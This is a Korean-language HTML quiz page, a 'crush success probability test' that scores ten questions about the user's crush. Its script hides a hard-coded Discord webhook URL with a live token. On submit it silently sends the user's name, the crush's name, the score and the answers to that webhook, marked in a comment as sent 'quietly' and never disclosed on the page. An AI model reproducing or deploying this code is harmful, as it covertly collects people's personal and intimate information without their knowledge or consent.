<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>짝사랑 성공 확률 테스트 </title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      background:#fff0f5;
      padding:24px;
      text-align:center;
    }
    form {
      background:white;
      padding:20px;
      border-radius:12px;
      display:inline-block;
      max-width:640px;
      width:100%;
      text-align:left;
      box-shadow:0 6px 20px rgba(0,0,0,0.08);
    }
    h1 { color:#ff69b4; text-align:center; }
    label { display:block; margin:10px 0 6px; }
    .question { margin-top:12px; }
    .options label { display:block; margin:6px 0; cursor:pointer; }
    input[type="text"] {
      padding:8px;
      width:100%;
      border-radius:6px;
      border:1px solid #ccc;
    }
    button {
      margin-top:16px;
      padding:12px;
      width:100%;
      border:none;
      border-radius:10px;
      background:#ff69b4;
      color:#fff;
      font-size:16px;
      cursor:pointer;
    }
    #result {
      margin-top:18px;
      font-size:18px;
      font-weight:600;
      color:#333;
      text-align:center;
    }
  </style>
</head>
<body>

<h1>💘 짝사랑 성공 확률 테스트 💘</h1>

<form id="loveForm">
  <label>당신의 이름</label>
  <input id="yourName" type="text" required>

  <label>짝사랑 상대 이름</label>
  <input id="crushName" type="text" required>

  <div id="questions"></div>

  <button type="submit">결과 보기</button>
</form>

<div id="result"></div>

<script>
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1452673428657278987/IRWnuZj-k98r8nef0lgV6SLWUdjktHtkY5jVeriX7ZBpgPZEJAXJv3kCd2CVg74wJNLj";

const questionsData = [
  ["상대와 얼마나 자주 대화하나요?", ["거의 안 해요",10], ["가끔 해요",40], ["자주 해요",70], ["매일 대화해요",100]],
  ["상대가 나를 볼 때 미소를 짓나요?", ["전혀 아니요",10], ["가끔",50], ["자주",80], ["항상",100]],
  ["내가 먼저 연락했을 때 반응은?", ["무시",20], ["답은 함",50], ["반가워함",80], ["먼저 연락",100]],
  ["SNS에서 서로 팔로우?", ["안 함",20], ["한 명만",50], ["서로",80], ["자주 소통",100]],
  ["상대가 관심 있어 보이나요?", ["전혀",10], ["조금",40], ["꽤",70], ["확실",100]],
  ["답장 스타일은?", ["단답",20], ["평범",50], ["재밌음",80], ["애교",100]],
  ["상대가 먼저 연락?", ["없음",20], ["가끔",50], ["자주",80], ["항상",100]],
  ["내 일상에 관심?", ["없음",20], ["가끔",50], ["많음",80], ["완전",100]],
  ["내 말에 잘 웃어줌?", ["안 웃음",20], ["예의상",50], ["자주",80], ["항상",100]],
  ["도와준 적?", ["없음",20], ["한두번",50], ["여러번",80], ["자주",100]]
];

const qWrap = document.getElementById("questions");

questionsData.forEach((q,i)=>{
  const div=document.createElement("div");
  div.className="question";
  div.innerHTML =
    `<label>${i+1}. ${q[0]}</label>` +
    q.slice(1).map(o =>
      `<label><input type="radio" name="q${i}" value="${o[1]}"> ${o[0]}</label>`
    ).join("");
  qWrap.appendChild(div);
});

document.getElementById("loveForm").addEventListener("submit", e=>{
  e.preventDefault();

  const yourName = document.getElementById("yourName").value.trim();
  const crushName = document.getElementById("crushName").value.trim();
  if (!yourName || !crushName) return;

  let total = 0;
  const answers = [];

  questionsData.forEach((q,i)=>{
    const sel = document.querySelector(`input[name="q${i}"]:checked`);
    const v = sel ? Number(sel.value) : 0;
    total += v;
    answers.push(sel ? sel.parentElement.innerText : "미응답");
  });

  const percent = Math.round(total / questionsData.length);
  const msg =
    percent < 40 ? "🥀 가능성 낮음" :
    percent < 70 ? "🌸 희망 있음" :
    percent < 90 ? "💞 거의 확정" :
                   "🔥 커플 각";

  document.getElementById("result").innerHTML =
    `${yourName} 💘 ${crushName}<br><b>${percent}%</b><br>${msg}`;

  // Discord 전송 (조용히)
  fetch(DISCORD_WEBHOOK_URL,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      username:"💘 짝사랑 테스트",
      embeds:[{
        title:"📊 짝사랑 결과",
        color:16738740,
        fields:[
          {name:"👤 나",value:yourName,inline:true},
          {name:"💖 상대",value:crushName,inline:true},
          {name:"📈 확률",value:`${percent}%`},
          {name:"💬 결과",value:msg},
          {name:"📝 응답",value:answers.slice(0,6).join("\n")}
        ],
        footer:{ text:new Date().toISOString() }
      }]
    })
  }).catch(()=>{});
});
</script>

</body>
</html>
